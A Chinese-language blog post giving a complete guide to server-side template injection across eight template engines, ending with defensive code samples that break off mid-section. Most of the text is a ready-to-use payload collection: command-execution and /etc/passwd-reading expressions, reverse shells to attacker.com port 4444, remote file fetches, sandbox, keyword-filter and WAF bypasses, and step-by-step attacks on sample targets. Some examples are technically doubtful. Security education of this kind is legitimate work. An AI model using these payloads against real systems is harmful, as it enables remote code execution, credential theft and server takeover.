---
layout: post
title: "SSTI服务器端模板注入完全指南：原理、技巧与防御"
date: 2026-03-16 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [SSTI, 模板注入, 漏洞分析, 安全防御, 渗透测试, Web安全, Jinja2, Twig]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是SSTI](#什么是ssti)
- [SSTI原理](#ssti原理)
- [各模板引擎注入技巧](#各模板引擎注入技巧)
- [Payload大全](#payload大全)
- [绕过技巧](#绕过技巧)
- [实战攻击案例](#实战攻击案例)
- [防御措施](#防御措施)
- [总结](#总结)

---

## 什么是SSTI

**SSTI（Server-Side Template Injection，服务器端模板注入）** 是一种Web安全漏洞，攻击者能够在服务器端注入恶意模板代码，导致服务器执行任意代码、读取敏感文件或执行其他恶意操作。

### SSTI与XSS、SQLi的区别

| 漏洞类型 | 执行位置 | 影响范围 | 危害程度 |
|---------|---------|---------|---------|
| **XSS** | 客户端（浏览器） | 影响当前用户 | 中 |
| **SQLi** | 数据库服务器 | 数据库数据 | 高 |
| **SSTI** | 应用服务器 | 整个服务器 | 极高 |

### SSTI的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 远程代码执行（RCE） | 在服务器上执行任意系统命令 |
| 敏感信息泄露 | 读取配置文件、环境变量、源代码 |
| 文件读写 | 读取任意文件、写入WebShell |
| 内网渗透 | 利用服务器作为跳板攻击内网 |
| 权限提升 | 获取服务器更高权限 |
| 服务拒绝 | 导致应用崩溃或资源耗尽 |

### 常见存在SSTI的场景

1. **用户资料页面**：允许用户自定义模板格式的个人主页
2. **邮件模板系统**：使用模板引擎渲染邮件内容
3. **报表生成系统**：动态生成PDF、Excel等报表
4. **CMS系统**：内容管理系统中的模板编辑功能
5. **在线代码编辑器**：支持模板语法的在线工具
6. **日志查看器**：格式化显示日志内容

---

## SSTI原理

### 模板引擎工作机制

模板引擎是一种将模板文件和数据结合生成最终输出的工具。基本工作流程：

```
模板文件 + 数据 → 模板引擎 → 最终输出
```

例如，一个简单的Jinja2模板：

{% raw %}
```html
<!-- template.html -->
<h1>Hello, {{ name }}!</h1>
<p>Your age is {{ age }}.</p>
```
{% endraw %}

渲染时传入数据 `{"name": "Alice", "age": 25}`，输出：

```html
<h1>Hello, Alice!</h1>
<p>Your age is 25.</p>
```

### 漏洞产生原因

SSTI漏洞产生的根本原因是**应用程序对用户输入的数据没有进行充分的验证和过滤**，直接将用户输入作为模板代码执行。

#### 漏洞代码示例

**Python Flask示例（存在漏洞）：**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 危险：直接使用用户输入渲染模板
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

**PHP Twig示例（存在漏洞）：**

```php
<?php
require_once '/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello, {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

// 危险：直接使用用户输入
echo $twig->render('index', ['name' => $_GET['name']]);
?>
```

**Java Spring示例（存在漏洞）：**

```java
@Controller
public class GreetingController {
    @GetMapping("/greet")
    public String greet(@RequestParam String name, Model model) {
        // 危险：如果name包含模板表达式会被执行
        model.addAttribute("message", "Hello, " + name);
        return "greeting";
    }
}
```

#### 攻击示例

正常请求：
```
http://example.com/greet?name=Alice
```

页面输出：
```html
<h1>Hello, Alice!</h1>
```

恶意请求（Jinja2）：
```
http://example.com/greet?name={% raw %}{{7*7}}{% endraw %}
```

页面输出：
```html
<h1>Hello, 49!</h1>
```

如果看到 `49` 而不是 `{% raw %}{{7*7}}{% endraw %}`，说明模板表达式被执行，存在SSTI漏洞。

### SSTI攻击流程

```
发现注入点 → 识别模板引擎 → 构造Payload → 利用漏洞 → 获取服务器权限
```

---

## 各模板引擎注入技巧

### 1. Jinja2 (Python)

Jinja2是Python最流行的模板引擎，被Flask等框架广泛使用。

#### 基础语法

{% raw %}
```jinja2
{{ variable }}           {# 变量输出 #}
{{ variable|filter }}    {# 过滤器 #}
{% if condition %}       {# 控制结构 #}
{% for item in items %}
```
{% endraw %}

#### 基础Payload

{% raw %}
```jinja2
{{ 7*7 }}                    {# 数学运算测试 #}
{{ config }}                 {# 查看配置对象 #}
{{ self.__init__ }}          {# 查看对象方法 #}
```
{% endraw %}

#### 信息收集Payload

{% raw %}
```jinja2
{{ config.items() }}                              {# 查看配置项 #}
{{ url_for.__globals__ }}                         {# 查看全局变量 #}
{{ request.application.__globals__ }}             {# 查看应用全局 #}
{{ get_flashed_messages.__globals__ }}            {# 查看消息全局 #}
```
{% endraw %}

#### RCE Payload

**方法1：使用os模块**

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['whoami']) }}
```
{% endraw %}

**方法2：使用__builtins__**

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```
{% endraw %}

**方法3：使用url_for**

{% raw %}
```jinja2
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('subprocess').check_output(['cat','/etc/passwd']) }}
```
{% endraw %}

**方法4：使用get_flashed_messages**

{% raw %}
```jinja2
{{ get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}
```
{% endraw %}

**方法5：使用lipsum（绕过某些限制）**

{% raw %}
```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
```
{% endraw %}

#### 文件读取Payload

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ url_for.__globals__['__builtins__']['open']('app.py').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['open']('config.py').read() }}
```
{% endraw %}

#### 沙箱绕过技巧

当Jinja2启用沙箱模式时，部分对象被限制：

{% raw %}
```jinja2
{# 使用tuple类绕过 #}
{{ ().__class__.__bases__[0].__subclasses__() }}

{# 查找os模块 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}

{# 使用warnings模块 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['warnings'].warn.__globals__['os'].popen('id').read() }}
```
{% endraw %}

#### 查找可利用的子类

{% raw %}
```jinja2
{{ ().__class__.__bases__[0].__subclasses__() }}           {# 列出所有子类 #}
{{ ().__class__.__mro__[1].__subclasses__() }}             {# 另一种方式 #}

{# 查找包含os或popen的子类 #}
{{ [].__class__.__base__.__subclasses__()[index].__init__.__globals__ for index in range(500) if 'os' in [].__class__.__base__.__subclasses__()[index].__init__.__globals__ }}
```
{% endraw %}

### 2. Twig (PHP)

Twig是PHP最流行的模板引擎，被Symfony等框架使用。

#### 基础语法

{% raw %}
```twig
{{ variable }}           {# 变量输出 #}
{{ variable|filter }}    {# 过滤器 #}
{% if condition %}       {# 控制结构 #}
{% for item in items %}
```
{% endraw %}

#### 基础Payload

{% raw %}
```twig
{{ 7*7 }}                    {# 数学运算测试 #}
{{ dump() }}                 {# 调试输出 #}
{{ _self }}                  {# 查看当前模板 #}
```
{% endraw %}

#### 信息收集Payload

{% raw %}
```twig
{{ _self.env.getFilter('filter_name') }}          {# 查看过滤器 #}
{{ _self.env.getFunction('function_name') }}      {# 查看函数 #}
{{ _self.env.getTest('test_name') }}              {# 查看测试 #}
```
{% endraw %}

#### RCE Payload (Twig 1.x)

{% raw %}
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("ls") }}
```
{% endraw %}

#### RCE Payload (Twig 2.x/3.x)

Twig 2.x和3.x限制了更多功能，但仍可利用：

{% raw %}
```twig
{# 使用map过滤器 #}
{{ ["id"]|map("system")|join }}
{{ ["cat /etc/passwd"]|map("system")|join }}

{# 使用filter过滤器 #}
{{ ["whoami"]|filter("system")|join }}

{# 使用reduce过滤器 #}
{{ ["ls", "-la"]|reduce("system") }}
```
{% endraw %}

#### 利用对象方法

{% raw %}
```twig
{{ app.request.server.all }}                      {# 查看服务器变量 #}
{{ app.request.headers.all }}                     {# 查看请求头 #}
{{ app.request.query.all }}                       {# 查看GET参数 #}
{{ app.request.request.all }}                     {# 查看POST参数 #}
```
{% endraw %}

#### 文件读取

{% raw %}
```twig
{{ source('app.php') }}                           {# 读取模板文件 #}
{{ source('/etc/passwd') }}                       {# 读取系统文件 #}
{{ include('/etc/passwd') }}                      {# 包含文件 #}
```
{% endraw %}

### 3. Smarty (PHP)

Smarty是另一个流行的PHP模板引擎。

#### 基础语法

{% raw %}
```smarty
{$variable}              {* 变量输出 *}
{function name="test"}   {* 函数调用 *}
{if condition}           {* 控制结构 *}
{foreach from=$array item=item}
```
{% endraw %}

#### 基础Payload

{% raw %}
```smarty
{7*7}                         {* 数学运算测试 *}
{$smarty.version}             {* 查看版本 *}
{$smarty.template}            {* 查看当前模板 *}
```
{% endraw %}

#### RCE Payload

**使用php标签（Smarty 2.x，默认禁用）：**

{% raw %}
```smarty
{php}echo system('id');{/php}
{php}echo shell_exec('cat /etc/passwd');{/php}
```
{% endraw %}

**使用fetch函数：**

{% raw %}
```smarty
{fetch file='file:///etc/passwd'}
{fetch file='http://attacker.com/shell.php'}
```
{% endraw %}

**使用mail函数（如果可用）：**

{% raw %}
```smarty
{mail to='attacker@example.com' subject='Test' from='test@test.com' 
      body='{shell_exec("id")}'}
```
{% endraw %}

#### 配置文件读取

{% raw %}
```smarty
{$smarty.config}              {* 查看配置 *}
{config_load file='config.conf'}
```
{% endraw %}

### 4. Freemarker (Java)

Freemarker是Java生态中广泛使用的模板引擎。

#### 基础语法

{% raw %}
```freemarker
${variable}              <#-- 变量输出 -->
<#if condition>          <#-- 控制结构 -->
<#list items as item>
```
{% endraw %}

#### 基础Payload

{% raw %}
```freemarker
${7*7}                       <#-- 数学运算测试 -->
${.version}                  <#-- 查看版本 -->
${.data_model}               <#-- 查看数据模型 -->
```
{% endraw %}

#### RCE Payload

**使用execute内置函数：**

{% raw %}
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
${ex("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")}
```
{% endraw %}

**使用ObjectConstructor：**

{% raw %}
```freemarker
<#assign classloader=class["java.lang.ClassLoader"].getSystemClassLoader()>
<#assign clazz=classloader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz.getMethod("getRuntime").invoke(null)>
${runtime.exec("id")}
```
{% endraw %}

**使用Jython（如果存在）：**

{% raw %}
```freemarker
<#assign value="org.python.core.PySystemState"?new()>
```
{% endraw %}

#### 文件读取

{% raw %}
```freemarker
<#assign file="/etc/passwd">
<#assign content=file?eval>
${content}
```
{% endraw %}

### 5. Velocity (Java)

Velocity是Apache的Java模板引擎。

#### 基础语法

{% raw %}
```velocity
$variable                ## 变量输出
#set($var = "value")     ## 变量赋值
#if(condition)          ## 控制结构
#foreach($item in $items)
```
{% endraw %}

#### 基础Payload

{% raw %}
```velocity
#set($x = 7 * 7)
$x                           ## 数学运算测试
$class.inspect("java.lang.Runtime")   ## 查看类
```
{% endraw %}

#### RCE Payload

**使用ClassTool：**

{% raw %}
```velocity
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..50])
#if($out.available()>0)
#set($chr=$out.read())
$str.valueOf($chr.toChar())
#end
#end
```
{% endraw %}

**简化版RCE：**

{% raw %}
```velocity
#set($process=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
#set($reader=$class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($process.getInputStream())))
#foreach($line in [$reader.readLine()])
$line
#end
```
{% endraw %}

#### 使用VelocityTools

{% raw %}
```velocity
$date                           ## 日期工具
$math.add(1, 2)                 ## 数学工具
$esc.html("<script>")           ## 转义工具
```
{% endraw %}

### 6. Thymeleaf (Java)

Thymeleaf是Spring Boot默认的模板引擎。

#### 基础语法

```html
<span th:text="${variable}">    <!-- 变量输出 -->
<span th:if="${condition}">     <!-- 条件判断 -->
<span th:each="item : ${items}"><!-- 循环 -->
```

#### 表达式类型

Thymeleaf支持多种表达式：

| 表达式类型 | 语法 | 用途 |
|-----------|------|------|
| 变量表达式 | `${...}` | 获取变量值 |
| 选择表达式 | `*{...}` | 选择对象属性 |
| 消息表达式 | `#{...}` | 国际化消息 |
| 链接表达式 | `@{...}` | URL生成 |
| 片段表达式 | `~{...}` | 模板片段 |

#### 基础Payload

```html
<span th:text="${7*7}">         <!-- 数学运算测试 -->
<span th:text="${T(java.lang.Math).random()}">  <!-- 调用静态方法 -->
```

#### RCE Payload

**使用SpEL表达式：**

```html
<span th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">
<span th:text="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\A').next()}">
```

**使用反射：**

```html
<span th:text="${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('whoami')}">
```

#### 预处理表达式（危险）

Thymeleaf的预处理表达式 `__${...}__` 会在正常表达式之前执行：

```html
<span th:text="__${T(java.lang.Runtime).getRuntime().exec('id')}__">
```

### 7. Django模板 (Python)

Django模板引擎相对安全，但仍存在利用可能。

#### 基础语法

{% raw %}
```django
{{ variable }}           {# 变量输出 #}
{% if condition %}       {# 控制结构 #}
{% for item in items %}
{{ variable|filter }}    {# 过滤器 #}
```
{% endraw %}

#### 基础Payload

{% raw %}
```django
{{ 7|add:7 }}                 {# 数学运算测试 #}
{{ request }}                 {# 查看请求对象 #}
{{ settings.SECRET_KEY }}     {# 尝试读取配置 #}
```
{% endraw %}

#### 信息收集

{% raw %}
```django
{{ request.path }}
{{ request.method }}
{{ request.headers }}
{{ request.COOKIES }}
{{ request.session }}
```
{% endraw %}

#### 利用debug信息

当Django开启DEBUG模式时：

{% raw %}
```django
{{ debug }}
{{ sql_queries }}
```
{% endraw %}

#### 读取配置（有限制）

{% raw %}
```django
{{ settings.DATABASES }}
{{ settings.INSTALLED_APPS }}
{{ settings.MIDDLEWARE }}
```
{% endraw %}

### 8. Ruby ERB

ERB是Ruby的默认模板引擎。

#### 基础语法

```erb
<%= variable %>          <%# 变量输出 %>
<% code %>               <%# 执行代码 %>
<%# comment %>           <%# 注释 %>
```

#### 基础Payload

```erb
<%= 7*7 %>                    <%# 数学运算测试 %>
<%= RUBY_VERSION %>           <%# 查看Ruby版本 %>
<%= ENV %>                    <%# 查看环境变量 %>
```

#### RCE Payload

```erb
<%= `id` %>                   <%# 反引号执行命令 %>
<%= system('whoami') %>       <%# system方法 %>
<%= exec('ls -la') %>         <%# exec方法 %>
<%= %x{cat /etc/passwd} %>    <%# %x语法 %>
<%= IO.popen('id').read %>    <%# IO.popen %>
<%= open('|id').read %>       <%# open管道 %>
```

#### 文件操作

```erb
<%= File.read('/etc/passwd') %>
<%= File.open('config.yml').read %>
<%= Dir.entries('.') %>
<%= Dir.glob('**/*') %>
```

#### 使用require加载模块

```erb
<% require 'socket' %>
<% require 'open-uri' %>
<%= URI.open('http://attacker.com/').read %>
```

---

## Payload大全

### SSTI检测Payload

用于快速检测是否存在SSTI漏洞：

| 模板引擎 | 检测Payload | 预期输出 |
|---------|------------|---------|
| Jinja2 | {% raw %}`{{7*7}}`{% endraw %} | 49 |
| Twig | {% raw %}`{{7*7}}`{% endraw %} | 49 |
| Smarty | `{7*7}` | 49 |
| Freemarker | `{% raw %}${7*7}{% endraw %}` | 49 |
| Velocity | `$class` 或 `#set($x=7*7)$x` | - |
| Thymeleaf | `{% raw %}${7*7}{% endraw %}` | 49 |
| Django | `{% raw %}{{7|add:7}}{% endraw %}` | 14 |
| ERB | `<%= 7*7 %>` | 49 |

### Jinja2 Payload大全

#### 信息收集

{% raw %}
```jinja2
{{ config }}                                      {# 查看Flask配置 #}
{{ request.headers }}                             {# 查看请求头 #}
{{ request.args }}                                {# 查看GET参数 #}
{{ request.form }}                                {# 查看POST参数 #}
{{ request.cookies }}                             {# 查看Cookie #}
{{ request.environ }}                             {# 查看环境变量 #}
{{ url_for.__globals__ }}                         {# 查看全局变量 #}
{{ get_flashed_messages.__globals__ }}            {# 查看消息全局 #}
```
{% endraw %}

#### 系统命令执行

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['whoami']) }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read() }}
```
{% endraw %}

#### 文件读取

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ url_for.__globals__['__builtins__']['open']('app.py').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['open']('config.py').read() }}
```
{% endraw %}

#### 反弹Shell

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('socket').socket().connect(('attacker.com', 4444)) }}
```
{% endraw %}

#### 复杂利用链

{% raw %}
```jinja2
{# 查找可利用的子类 #}
{{ ().__class__.__bases__[0].__subclasses__() }}

{# 找到warnings.catch_warnings类（通常包含os） #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}

{# 使用__reduce__执行命令 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('whoami').read() }}
```
{% endraw %}

### Twig Payload大全

#### 信息收集

{% raw %}
```twig
{{ dump() }}                                      {# 调试输出所有变量 #}
{{ dump(app) }}                                   {# 查看app对象 #}
{{ app.request.server.all }}                      {# 服务器变量 #}
{{ app.request.headers.all }}                     {# 请求头 #}
{{ _self.env.getFilters() }}                      {# 所有过滤器 #}
{{ _self.env.getFunctions() }}                    {# 所有函数 #}
```
{% endraw %}

#### RCE (Twig 1.x)

{% raw %}
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("cat /etc/passwd") }}
{{ _self.env.registerUndefinedFilterCallback("passthru") }}{{ _self.env.getFilter("ls -la") }}
```
{% endraw %}

#### RCE (Twig 2.x/3.x)

{% raw %}
```twig
{{ ["id"]|map("system")|join }}
{{ ["cat /etc/passwd"]|map("system")|join }}
{{ ["whoami"]|filter("system")|join }}
{{ ["ls", "-la"]|reduce("system") }}
```
{% endraw %}

#### 文件读取

{% raw %}
```twig
{{ source('app.php') }}
{{ source('/etc/passwd') }}
{{ include('/etc/passwd') }}
```
{% endraw %}

### Freemarker Payload大全

#### 信息收集

{% raw %}
```freemarker
${.version}
${.data_model}
${.locale}
${.template_name}
```
{% endraw %}

#### RCE

{% raw %}
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
${ex("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")}
```
{% endraw %}

#### 使用API RCE

{% raw %}
```freemarker
<#assign value="freemarker.template.ObjectWrapper"?new()>
<#assign value=value.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/').toURL()>
```
{% endraw %}

### Velocity Payload大全

#### 信息收集

{% raw %}
```velocity
$class.inspect("java.lang.System").type.getProperties()
$class.inspect("java.lang.Runtime").type.getRuntime()
$class.inspect("java.lang.Thread").type.currentThread()
```
{% endraw %}

#### RCE

{% raw %}
```velocity
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
#set($out=$ex.getInputStream())
#set($reader=$class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.InputStreamReader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($out)))
#set($line=$reader.readLine())
$line
```
{% endraw %}

### Ruby ERB Payload大全

#### 基础命令执行

```erb
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= system('ls') %>
<%= exec('pwd') %>
<%= %x{uname -a} %>
<%= IO.popen('id').read %>
```

#### 文件操作

```erb
<%= File.read('/etc/passwd') %>
<%= File.write('/tmp/test', 'content') %>
<%= Dir.entries('/') %>
<%= Dir.glob('**/*.rb') %>
```

#### 网络操作

```erb
<% require 'socket' %>
<%= TCPSocket.open('attacker.com', 4444).puts('connected') %>
<% require 'open-uri' %>
<%= URI.open('http://attacker.com/').read %>
```

---

## 绕过技巧

### 1. 关键字过滤绕过

#### 过滤 `__class__`

{% raw %}
```jinja2
{# 使用attr过滤器 #}
{{ ()|attr("\x5f\x5fclass\x5f\x5f") }}
{{ ()|attr("__"+"class"+"__") }}

{# 使用__getattribute__ #}
{{ ().__getattribute__("__class__") }}
```
{% endraw %}

#### 过滤 `__import__`

{% raw %}
```jinja2
{# 使用__builtins__的其他方式 #}
{{ self.__init__.__globals__.__builtins__.exec("import os; print(os.system('id'))") }}

{# 使用compile + exec #}
{{ self.__init__.__globals__.__builtins__.exec(compile("import os; os.system('id')", "", "exec")) }}
```
{% endraw %}

#### 过滤 `os`

{% raw %}
```jinja2
{# 使用subprocess代替 #}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['id']) }}

{# 使用pty #}
{{ self.__init__.__globals__.__builtins__.__import__('pty').spawn('/bin/sh') }}
```
{% endraw %}

#### 过滤 `popen` / `system`

{% raw %}
```jinja2
{# 使用其他方法 #}
{{ self.__init__.__globals__.__builtins__.__import__('os').execl('/bin/sh', 'sh') }}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').call(['id']) }}
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').run(['whoami']) }}
```
{% endraw %}

### 2. 沙箱限制绕过

#### Jinja2沙箱绕过

当使用SandboxedEnvironment时：

{% raw %}
```jinja2
{# 使用tuple类 #}
{{ ().__class__.__bases__[0].__subclasses__() }}

{# 查找包含os的类 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}

{# 使用warnings模块 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['warnings'].warn.__globals__['os'].popen('id').read() }}
```
{% endraw %}

#### 使用编码绕过

{% raw %}
```jinja2
{# 使用十六进制编码 #}
{{ ()|attr("\x5f\x5fclass\x5f\x5f") }}
{{ self|attr("\x5f\x5finit\x5f\x5f") }}

{# 使用Unicode编码 #}
{{ ()|attr("\u005f\u005fclass\u005f\u005f") }}
```
{% endraw %}

### 3. WAF绕过技巧

#### 空格绕过

{% raw %}
```jinja2
{# 使用注释代替空格 #}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

{# 使用换行 #}
{{
self
.__init__
.__globals__
.__builtins__
.__import__('os')
.popen('id')
.read()
}}
```
{% endraw %}

#### 使用替代语法

{% raw %}
```jinja2
{# 使用~进行字符串连接 #}
{{ self["__"~"init"~"__"] }}

{# 使用+进行字符串连接 #}
{{ self["__"+"class"+"__"] }}
```
{% endraw %}

#### 使用过滤器链

{% raw %}
```jinja2
{# 使用join过滤器 #}
{{ ["__", "class", "__"]|join }}

{# 使用replace过滤器 #}
{{ "__CLASS__"|replace("CLASS", "class")|lower }}
```
{% endraw %}

### 4. 编码绕过

#### Unicode编码

{% raw %}
```jinja2
{{ ()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f") }}
```
{% endraw %}

#### HTML实体编码

在URL参数中使用：

```
?name=%7B%7B7*7%7D%7D
?name=%7B%7B%5F%5Fclass%5F%5F%7D%7D
```

#### Base64编码（配合解码）

{% raw %}
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('base64').b64decode('b3M=') }}
```
{% endraw %}

### 5. 黑名单绕过技巧

#### 绕过 `.` 过滤

{% raw %}
```jinja2
{# 使用attr过滤器 #}
{{ ()|attr('__class__')|attr('__bases__') }}

{# 使用__getitem__ #}
{{ self['__init__']['__globals__'] }}
```
{% endraw %}

#### 绕过 `[]` 过滤

{% raw %}
```jinja2
{# 使用__getitem__方法 #}
{{ ().__class__.__bases__.__getitem__(0) }}
{{ ().__class__.__mro__.__getitem__(1) }}
```
{% endraw %}

#### 绕过 `()` 过滤

{% raw %}
```jinja2
{# 使用__call__ #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen.__call__('id').read() }}
```
{% endraw %}

#### 绕过引号过滤

{% raw %}
```jinja2
{# 使用request对象 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.c](request.args.d).read() }}

{# URL: ?c=os&d=id #}
```
{% endraw %}

---

## 实战攻击案例

### 案例1：通过SSTI获取RCE

**场景**：某网站使用Flask开发，存在SSTI漏洞。

**步骤1：确认漏洞**

```
http://target.com/greet?name={% raw %}{{7*7}}{% endraw %}
```

返回 `49`，确认存在Jinja2 SSTI。

**步骤2：信息收集**

```
http://target.com/greet?name={% raw %}{{config}}{% endraw %}
```

获取Flask配置信息，包括SECRET_KEY等。

**步骤3：执行命令**

```
http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
```

返回 `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**步骤4：读取敏感文件**

```
http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}{% endraw %}
```

**步骤5：获取反弹Shell**

```
http://target.com/greet?name={% raw %}{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read()}}{% endraw %}
```

### 案例2：绕过沙箱执行命令

**场景**：目标使用Jinja2的SandboxedEnvironment，限制了危险对象。

**绕过方法**：

{% raw %}
```jinja2
{# 使用tuple类查找子类 #}
{{ ().__class__.__bases__[0].__subclasses__() }}

{# 找到包含os的类（通常是warnings.catch_warnings） #}
{{ ().__class__.__bases__[0].__subclasses__()[132] }}

{# 利用该类执行命令 #}
{{ ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() }}
```
{% endraw %}

### 案例3：Twig模板RCE

**场景**：某PHP网站使用Twig 2.x模板引擎。

**检测**：

```
http://target.com/page?name={% raw %}{{7*7}}{% endraw %}
```

返回 `49`，确认存在Twig SSTI。

**利用**：

```
http://target.com/page?name={% raw %}{{["id"]|map("system")|join}}{% endraw %}
```

执行 `id` 命令。

**读取文件**：

```
http://target.com/page?name={% raw %}{{source('/etc/passwd')}}{% endraw %}
```

### 案例4：Freemarker RCE

**场景**：某Java网站使用Freemarker模板引擎。

**检测**：

```
http://target.com/page?name=${7*7}
```

返回 `49`，确认存在Freemarker SSTI。

**RCE利用**：

```
http://target.com/name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 案例5：CTF题目解析

**题目**：某CTF题目提供了一个Flask应用源码：

```python
from flask import Flask, request, render_template_string
import re

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    # 过滤了危险字符
    blacklist = ['import', 'os', 'system', 'popen', 'subprocess', '__builtins__']
    for word in blacklist:
        if word in name.lower():
            return 'Hacker!'
    template = f'<h1>Hello, {name}!</h1>'
    return render_template_string(template)
```

**绕过思路**：

1. 使用编码绕过关键字检查
2. 使用其他方式导入模块

**Payload**：

{% raw %}
```
http://target.com/?name={{self.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').po'+'pen('id').read()}}
```
{% endraw %}

或者使用 `lipsum` 对象：

{% raw %}
```
http://target.com/?name={{lipsum.__globals__['os'].popen('id').read()}}
```
{% endraw %}

---

## 防御措施

### 1. 输入验证和过滤

#### 白名单验证

```python
import re
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 只允许字母、数字和空格
    if not re.match(r'^[a-zA-Z0-9\s]+$', name):
        return 'Invalid name', 400
    template = '<h1>Hello, {{ name }}!</h1>'
    return render_template_string(template, name=name)
```

#### 转义特殊字符

```python
from markupsafe import escape

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 转义HTML特殊字符
    safe_name = escape(name)
    return f'<h1>Hello, {safe_name}!</h1>'
```

### 2. 使用安全的模板渲染方式

#### 分离模板和数据

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # 使用模板文件，不直接拼接
    return render_template('greet.html', name=name)
```

#### 使用自动转义

```python
from jinja2 import Environment, PackageLoader, select_autoescape

env = Environment(
    loader=PackageLoader('yourapp'),
    autoescape=select_autoescape(['html', 'xml'])
)
```

### 3. 沙箱化执行环境

#### Jinja2沙箱

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
result = template.render()
```

#### 限制可用对象

```python
